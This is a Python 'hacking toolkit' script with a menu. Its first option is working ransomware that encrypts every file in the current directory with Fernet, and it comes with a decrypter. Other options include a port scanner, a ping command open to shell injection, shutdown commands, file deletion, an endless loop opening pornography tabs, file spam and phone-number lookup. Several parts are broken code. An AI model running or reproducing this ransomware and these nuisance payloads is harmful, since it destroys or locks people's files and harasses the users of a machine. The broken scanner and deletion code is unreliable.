#Imports
from cryptography.fernet import Fernet
import random
import webbrowser
import time
import os
import socket
import subprocess
import requests
import sys
import phonenumbers
import opencage
from phonenumbers import geocoder
from opencage.geocoder import OpenCageGeocode
from phonenumbers import carrier
from phonenumbers import timezone
from phonenumbers import phonemetadata

#Title Screen and loading
print("|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#####~~~~~~~~~###~~~~~~|\n"
"|~~~~~~~~###~~~###~~~~~####~~~~####~~####~~~~~~#####~~~~~~~###~~~~~##~~###~~~~~###~~~~~~~~~|\n"
"|~~~~~~~##~~###~~##~~~##~~~~~~##~~####~~##~~~~##~~~##~~~~~##~##~~~##~~~~~~####~~~~~~~~~~~~~|\n"
"|~~~~~##~~~~~#~~~~##~~##~~~~~##~~~~##~~~~##~~~#######~~~~##~~~##~##~~~~~~~####~~~~~~~~~~~~~|\n"
"|~~~~##~~~~~~~~~~~~##~##~~~~##~~~~~~~~~~~~##~~##~~~##~~~##~~~~~###~~~~~~###~~~###~~~~~~~~~~|\n"
"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##~~~~~~~~~~~~~###~~~~~~~~###~~~~~~~~|")
time.sleep(2)
print("-!!Make sure this file is runing in this machines hard drive or SSD else you might damage your USB or extenal device!!-")
time.sleep(1)
print("Loading...")
time.sleep(4)
print("Ready!")
time.sleep(1)

while True:
	print("Choose a option. Or type h or help")
	choice = input("1.Ransomeware\n2.Scanners\n"    
	"3.Power Options\n4.IP\n5.Random Crap\n>")

#Ransomeware
	if choice == "1":
		R_choice = input("--Ransomware--\n"
		"What do you want to do?\n"
		"1.Inflict Ransomeware (Very Destructive)\n"
		"2.Decypt With a Key\n"
		">") 
		if R_choice == "1":

			files = []
			for file in os.listdir():
				if file == "MrManX.py" or file == "the key.key":
					continue
				if os.path.isfile(file):
					files.append(file)
			print(files)

			key = Fernet.generate_key()

			with open("thekey.key","wb") as thekey:
				thekey.write(key)
			
			for file in files:
				with open(file,"rb") as thefile:
					contents = thefile.read()
				contents_encrypted = Fernet(key).encrypt(contents)
				with open(file,"wb") as thefile:
					thefile.write(contents_encrypted)
		
		if R_choice == "2":

			sk = input("Input Your Key >")
			
			files = []
			for file in os.listdir():
				if file == "MrMan.py" or file == "the key.key":
					continue
				if os.path.isfile(file):
					files.append(file)
			print(files)

			secretkey = sk
			
			for file in files:
				with open(file,"rb") as thefile:
					contents = thefile.read()
				contents_decrypted = Fernet(secretkey).decrypt(contents)
				with open(file,"wb") as thefile:
					thefile.write(contents_decrypted)
	
	if choice == "2":
		s_choice = input("What Scanner do you want to use?\n"
		"1.Port Scanner\n2.Ip Ping\n> ")

		if s_choice == "1":
	
			target = input('Enter the host to be scanned (Example 127.0.0.1)> ')
			target_IP = gethostbyname(target)
			print ('Starting scan on host ', target_IP)
			print ("This Might Take A While!")

			for x in range(50, 500):
				s = socket(AF_INET, SOCK_STREAM)
					
				connect = s.connect_ex((target_IP, x))
				if(connect == 0) :
					print ('Port %d: OPEN' % (x,))
				s.close()

		if s_choice == "2":
			p_target = input("What Website/IP do you want to ping> ")
			p = os.system('ping '+ p_target)
			if p == 0:
				print ('-------------------------------------------------\n'
				'The IP/Website ' + p_target +' is Active\n'
				'-------------------------------------------------')
			else:
				print('-------------------------------------------------\n'
				'The IP/Website '+ p_target + ' Could not be found or is down\n'
				'-------------------------------------------------')		
	
	if choice == "3":
		print("[-Power Options-]")
		time.sleep(1)
		
		power_op = input("1.Shut down\n2.Restart\n3.Log Off\n> ")
		
		if power_op == "1":
			os.system('shutdown -s')
			print("!-This may take a minute-!")
		
		if power_op == "2":
			os.system('shutdown -r')
			print("!-This may take a minute-!")
		
		if power_op == "3":
			os.system('shutdown -l')
			print("!-This may take a minute-!")

	if choice == "4":
		w_choice = input("What IP Option do you want:\n"
		"1.IP Stealer\n>")

		if w_choice == "1":
			ip = socket.gethostbyname(socket.gethostname())
			print("\n""|The IP of the address of the machine is " + ip, "|\n")

		

	
	if choice == "5":
		print ("|Random Crap|")
		time.sleep(1)
		print("loading...")
		time.sleep(2)
		print("Ready!")
		time.sleep(0.5)
		rc = input("-Welcome to Random Crap-\n1.Delete Everything!\n2.Naughty Web Spam 18+\n3.Numbered File Maker\n4.You are a Professional Idiot\n5.Phone Number Info Base\n>")
		if rc == "1":
			dfilesyn = input("Are you sure you want to do this! y/n > ")
			if dfilesyn == "yes" or dfilesyn == "y":
				dfiles = []
				for file in os.listdir():
					if os.path.isfile(file):
						dfiles.append(file)
						print(dfiles)
						os.remove(dfiles)
			else:
				continue
		
		if rc == "2":
			while True:
				webbrowser.open_new_tab("www.pornhub.com")
		
		if rc == "3":
			print("-!The more files you inject the longer it will take but more space will be taken!-\n -MrMan")
			hmf = int(input("How many files do you want to inject: "))

			for i in range(0,hmf):
				filename = "MrMan_" +str(i) + "_.txt"
				command = " " + filename
				os.system(command)
				command = "echo MrMan was here >" + filename
				os.system(command)

		if rc == "4":
			webbrowser.open_new_tab('https://youareanidiot.cc/')	

		if rc == "5":
			num = input("What number do you want to find more about (Example: +(Country Code) The Number)")	
			
			print("__________________________________________")
			parse_num = phonenumbers.parse(num)
			location = geocoder.description_for_number(parse_num, "en")
			print("Country - " + location)

			ser_provider = phonenumbers.parse(num)
			print("Service Provider - "+ carrier.name_for_number(ser_provider, "en"))

			timeZone = str(timezone.time_zones_for_number(parse_num))
			timez = "TimeZone - "
			print(timez + timeZone)

			reg_code = phonenumbers.region_code_for_number(parse_num)
			print("Region Code - " + reg_code)

			meta_data = phonemetadata.PhoneMetadata(parse_num)
			print("Meta Data Found -",meta_data)

					
			print("---------------------------------------------")

	if choice == "help" or choice == "h":
		print("---------------")
		print("|HELP CENTER|")
		print("---------------------------------------------------------------------------------")
		print("1. Ransomeware \n 1. Ransomeware - Ransomewares the machine with MrManX running on it \n 2. Ransomeware Decrypter -Decrypts the ransomeware with a key inputed by the user\n"
		"2. Scanners \n 1. Port Scanner - Scans for open ports on the inputed IP\n 2. IP Ping - Pings a IP or website if it is active\n"
		"3. Power Options \n 1. Shut down - Shuts down the machine\n 2. Restart - Restarts the Machine\n 3.Log Out - Logs out of the machine\n"
		"4. IP \n 1. IP Stealer - Tells you the IP of the machine\n"
		"5. Random Crap \n 1. Delete Everything - Deletes Everything\n 2. Naughty web spam 18+ - Loads multiple tabs of po*nhub untill MrManX is closed or PC Crashes\n"
		" 3. Numbered File Maker - Makes as many files as you want\n 4. You are a Professional Idiot - A web version of the 'You are an idiot Virus'\n 5. Phone Number Info Base - Gives infomation about any vaild number that you input ")
		print("---------------------------------------------------------------------------------")